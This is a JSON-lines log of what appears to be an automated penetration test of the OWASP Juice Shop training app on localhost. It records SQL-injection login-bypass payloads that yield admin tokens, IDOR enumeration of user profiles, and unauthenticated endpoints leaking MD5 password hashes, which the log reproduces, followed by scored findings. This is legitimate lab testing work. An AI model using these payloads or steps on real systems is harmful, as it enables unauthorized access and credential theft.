{"ts":"2026-04-12T00:00:01Z","action":"phase_start","phase":"recon","detail":"Starting Broken Access Control / IDOR testing on http://localhost:3000"}
{"ts":"2026-04-12T00:00:02Z","action":"probe","payload":"' OR 1=1--","endpoint":"/rest/user/login","param":"email","result":"success","detail":"Admin JWT obtained via SQLi: admin@juice-sh.op (id=1, role=admin)"}
{"ts":"2026-04-12T00:00:03Z","action":"probe","payload":"' OR 1=1 LIMIT 1 OFFSET 2--","endpoint":"/rest/user/login","param":"email","result":"success","detail":"User JWT obtained via SQLi: bender@juice-sh.op (id=3, role=customer)"}
{"ts":"2026-04-12T00:00:05Z","action":"phase_start","phase":"experiment","detail":"Running access control tests"}
{"ts":"2026-04-12T00:00:06Z","action":"probe","payload":"GET /rest/admin","endpoint":"/rest/admin","result":"blocked","detail":"HTTP 500 - Unexpected path error, not a viable endpoint"}
{"ts":"2026-04-12T00:00:07Z","action":"probe","payload":"GET /snippets (no auth)","endpoint":"/snippets","result":"redirect","detail":"Returns Angular SPA - endpoint serves frontend only"}
{"ts":"2026-04-12T00:00:08Z","action":"probe","payload":"GET /api/Users/1","endpoint":"/api/Users/1","param":"id","result":"vulnerable","detail":"HTTP 200 - bender (id=3, customer) reads admin profile (id=1). IDOR confirmed."}
{"ts":"2026-04-12T00:00:09Z","action":"probe","payload":"PUT /api/Users/1 {email:hacked@pwned.com}","endpoint":"/api/Users/1","param":"id","result":"blocked","detail":"HTTP 401 - PUT requires valid token signature, write IDOR blocked"}
{"ts":"2026-04-12T00:00:10Z","action":"probe","payload":"GET /rest/memories (no auth)","endpoint":"/rest/memories","result":"vulnerable","detail":"HTTP 200 - Returns 10 memories with User objects including MD5 password hashes. CRITICAL."}
{"ts":"2026-04-12T00:00:11Z","action":"probe","payload":"GET /rest/user/authentication-details/ (user token)","endpoint":"/rest/user/authentication-details/","result":"vulnerable","detail":"HTTP 200 - Regular user receives full list of 21 users. Missing admin role check."}
{"ts":"2026-04-12T00:00:12Z","action":"probe","payload":"GET /api/Challenges/ (no auth)","endpoint":"/api/Challenges/","result":"vulnerable","detail":"HTTP 200 - 111 challenges with descriptions exposed. Info disclosure."}
{"ts":"2026-04-12T00:00:15Z","action":"phase_start","phase":"test","detail":"Confirming exploitability and severity of each sub-finding"}
{"ts":"2026-04-12T00:00:16Z","action":"probe","payload":"IDOR enum /api/Users/1-10","endpoint":"/api/Users/{id}","result":"vulnerable","detail":"Enumerated 10 users (admin, customer, deluxe roles) as regular user. Horizontal + vertical privilege escalation."}
{"ts":"2026-04-12T00:00:20Z","action":"probe","payload":"MD5 hash extraction from /rest/memories","endpoint":"/rest/memories","result":"vulnerable","detail":"Extracted hashes: bjoern@owasp.org=9283f1b2e9669749081963be0462e466 (deluxe), bjoern.kimminich@gmail.com=6edd9d726cbdc873c539e41ae8757b8c (admin). MD5 no-salt, crackable."}
{"ts":"2026-04-12T00:00:25Z","action":"phase_start","phase":"verify","detail":"Reproducing each finding 3x for confirmation"}
{"ts":"2026-04-12T00:00:26Z","action":"verify","type":"idor","endpoint":"/api/Users/1","param":"id","result":"confirmed","detail":"F-004-A reproduced 3/3 times. HTTP 200 each time."}
{"ts":"2026-04-12T00:00:28Z","action":"verify","type":"unauthenticated_access","endpoint":"/rest/memories","result":"confirmed","detail":"F-004-B reproduced 3/3 times. Hash 9283f1b2e9669749081963be0462e466 returned consistently."}
{"ts":"2026-04-12T00:00:30Z","action":"verify","type":"broken_access_control","endpoint":"/rest/user/authentication-details/","result":"confirmed","detail":"F-004-C reproduced 3/3 times. 21 users returned each time."}
{"ts":"2026-04-12T00:00:32Z","action":"verify","type":"info_disclosure","endpoint":"/api/Challenges/","result":"confirmed","detail":"F-004-D reproduced. 111 challenges always exposed without auth."}
{"ts":"2026-04-12T00:00:35Z","action":"finding","type":"idor","endpoint":"/api/Users/{id}","param":"id","severity":"HIGH","cvss":"7.5","cwe":"CWE-639","detail":"F-004-A: IDOR allows any authenticated user to read any other user profile by ID"}
{"ts":"2026-04-12T00:00:36Z","action":"finding","type":"broken_access_control","endpoint":"/rest/memories","severity":"CRITICAL","cvss":"9.1","cwe":"CWE-200","detail":"F-004-B: Unauthenticated endpoint exposes MD5 password hashes of multiple users including admins"}
{"ts":"2026-04-12T00:00:37Z","action":"finding","type":"broken_access_control","endpoint":"/rest/user/authentication-details/","severity":"HIGH","cvss":"8.1","cwe":"CWE-284","detail":"F-004-C: Missing admin check allows regular user to list all 21 system users"}
{"ts":"2026-04-12T00:00:38Z","action":"finding","type":"info_disclosure","endpoint":"/api/Challenges/","severity":"MEDIUM","cvss":"5.3","cwe":"CWE-200","detail":"F-004-D: Unauthenticated exposure of 111 application challenges reveals full attack surface"}
{"ts":"2026-04-12T00:00:40Z","action":"poc_run","result":"success","detail":"poc.py executed: 4/4 sub-findings VULNERABLE. All output captured in poc_output.txt"}
{"ts":"2026-04-12T00:00:41Z","action":"phase_complete","phase":"verify","detail":"All findings written to F-004/ directory. Primary severity: CRITICAL CVSS 9.1"}
